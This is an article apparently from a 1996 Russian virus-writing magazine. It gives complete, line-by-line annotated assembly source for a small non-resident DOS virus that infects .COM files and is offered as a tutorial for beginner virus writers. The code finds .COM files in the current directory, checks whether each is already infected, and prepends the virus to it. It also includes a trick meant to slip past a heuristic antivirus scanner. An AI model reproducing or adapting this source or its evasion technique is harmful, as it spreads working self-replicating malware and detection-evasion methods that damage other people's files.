;      ▄▄                  █
;     ▀▀▀  Virus Magazine  █ Box 10, Kiev 148, Ukraine       IV  1996
;     ▀██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀▀▀▀▐▀▀▀  █▀▀▀▀▀▀█
;      ▐█ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▄█▄ ▄▀▀ █▀█    ▌ █ ▄▀█ █ ▄▀▀ █▄▄   █ █▀▀█ █ 
;       █ █ █ █▀  █▀  █    █  █▀  █ █    █ █ █ █ █ █   █     █ ▀▀▀█ █
;       █ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀     ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄▄  █ █▄▄█ █
;       ▐ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  █▄▄▄▄▄▄█
;       (C) Copyright, 1994-96, by STEALTH group WorldWide, unLtd.

; Как учитьcя вирмэйкингу, тем, кто практичеcки не знает asm'a ?
; Для таких людей был напиcан этот небольшой - 200 байт вируc.
; Вcе очень проcто и понятно, не то что в Хижняке ;))) 
; Я думаю этот вируc - для начинающих - поможет им.

;				   (c) by Int O`Dream (1996)

; [Example 200]
; Com-NonResident from the current directory
; Was written only for Example (for Beginers)

.model tiny
.code
org 100h
start:
mov bp,ds:[len_of_infected_program]  ; Сохраняем длинну зараженной уже нами
				     ; проги в bp, чтобы потом использовать
				     ; область памяти Len_of_infected_program
				     ; для заражения других прог.

mov cx,100				; длинна DTA
mov si,80h  				; Начиная с 80h
mov di,buf1 				; И все это в буфер
cld					
rep movsb   				; Сохраняем DTA
mov ah,4eh				; функция поиска первого файла

find:
db 068h			; а
dw offset @web1		; это
ret			; небольшой
pop ax			; прикол
@web1:			; для web'a - теперь нас не видно эвристикой (web 3.10)

mov cx,20h              ; с атрибутом ARCHIVE
lea dx,fmask		; и по маске только .COM файлы
int 21h			; собственно само прерывание
jc quit			; если файлов таких уже (или еще ;))) ) нет,
			; то на выход  

cmp word ptr ds:[9ah],len        ; по смещению 9ah - длинна найденной проги 
jb next			  	 ; если длинна эта меньше длины вируса то next
cmp word ptr ds:[9ah],61000      ; а если она вдруг больше 63000 
ja next		 		 ; то аналогичный результат


mov ax,3d02h		; функция открытия файла для чтения/записи
mov dx,9eh		; функии поиска возвращают имя программы в DTA
			; (DATA TRANSFER AREA) по умолчанию при загрузке 
			; проги DTA находится в верхней части PSP - в области
			; командной строки - PSP:80h поэтому не сохранив эту
			; область мы автоматичеки теряем все параметры из 
			; командной строки. Начиная со смещения 9eh в PSP 
			; после поиска и опять же по умолчанию начинается 
			; имя найденного файла, которое заканчивается нулем.
			 
int 21h			; мы открываем найденный нами файл.
jc next			; если ошибка то на метку next

xchg ax,bx   		; при открытии в AX возвращается HANDLE открытого 
			; файла. мы записываем это значение в BX для 
			; дальнейших операций.

mov ah,3fh		; функция чтения из файла, который адресуется через
			; bx - по handle.
mov cx,len		; количество считываемых байт
mov dx,buf		; буфер, куда считывать
int 21h			; само прерывание

mov si,dx		; si=buf, так как dx это не индексный регистр и через
			; него нельзя задавать смещение
cmp word ptr [ds:si],2e8bh 	; первые 2 байта считанной проги совпадают
				; с первыми 2 байтами вируса ?
jz next				; да ? значит прога уже не заражена - на выход

cmp byte ptr [ds:si],'Z'	; А не является ли
jz next				; эта прога случайно
cmp byte ptr [ds:si],'M'	; EXEшником (в начале ZM или MZ)
jnz @1                          ; переименованым в COM ? 

next:				; мы встретили брата ? 
mov ah,3eh			; функция закрытия файла
int 21h				; прерывание
mov ah,4fh			; функция поиска следующего 
jmp find			; и на поискать идем опять в начало

@1:
mov ax,4202h			; функция перемещения pointer'a 
				; в данном случае в конец файла 
xor cx,cx			; смещение отступа 
xor dx,dx			; от конца = 0
int 21h				; прерывние
jc next				; ошибки ? опять на поискать

mov ds:[len_of_infected_program],ax  ; после перемещения pointer'a в AX
				     ; нам возвращается длинна проги
	
mov ah,40h	; функция записи в файл 
mov cx,len	; длинна
mov dx,buf	; из буфера
int 21h		; то есть мы записали начало проги по размеру равное нашему 
		; вирусу в ее конец.
jc next		; ошибки ? снова идем искать, кто не спрятался вирус не виноват

mov ax,4200h  ; функция перемещения pointer'a, теперь уже в начало проги
xor cx,cx     ; смещения от начала
xor dx,dx     ; равны 0
int 21h       ; перемещаем 
jc next	      ; ошибки ? мы идем искать следующий 

mov ah,40h    ; функция записи в файл
mov dx,100h   ; начиная со смещения 100h 
mov cx,len    ; длинна вируса
int 21h       ; и записываем вирус в начало проги
jc next	      ; ошибки ? ну вы знаете 

quit:	    ; выход здесь !

mov di,80h
mov si,buf1
mov cx,100h
push cx 
rep movsb  ; Восстанавливаем DTA

pop di ; di = начале проги = 100h
push di ; 100h begin of program  ; эту сотню мы в стек
mov si,bp	; si = длинна зараженной проги
add si,100h     ; прибавим еще 100h - длинну PSP
mov bx,other    ; кусок памяти вверху
push bx         ; мы его адрес в стек
mov word ptr ds:[bx],0a4f3h   ; rep movsb
mov byte ptr ds:[bx+2],0c3h   ; ret

			; и запишем в этот кусок эти самые команды

xor ax,ax    ; обнулим эти
xor bx,bx    ; регистры
mov cx,len   ; длина = len
ret          ; и передадим управление этим командам в этом (выше) блоке.

		; небольшое лирическое отступление:
		; команда movsb пересылает 1 байт из ds:si в es:di
		; префикс rep говорит команде, что делать это надо не 1 раз
		; а столько, сколько записано в CX, а команда CLD говорит,
		; что надо копировать вперед, то есть после команды MOVSB 
   		; SI=SI+1, DI=DI+1
		
	      ; в итоге мы скопируем начало зараженной уже нами проги 
	      ; (то есть той, из которой мы уже выполняемся) в начало 
	      ; и передадим ей управление по адресу 100h 

	      ; И все ? все
		
fmask db '*.com',0 ; маска файлов, которые мы будем искать
mess db '3мун'
len_of_infected_program dw len ; это уже и по названию ясно
buf equ 0f000h		       ; буфер с которым мы работаем - высоко высоко
other equ 0f000h+len+1	       ; а это второй буфер для команд, он еще выше
buf1 equ other+4
len equ $-start		       ; длинна вируса
ret 			       ; для инсталяции
end start		       ; это финал 
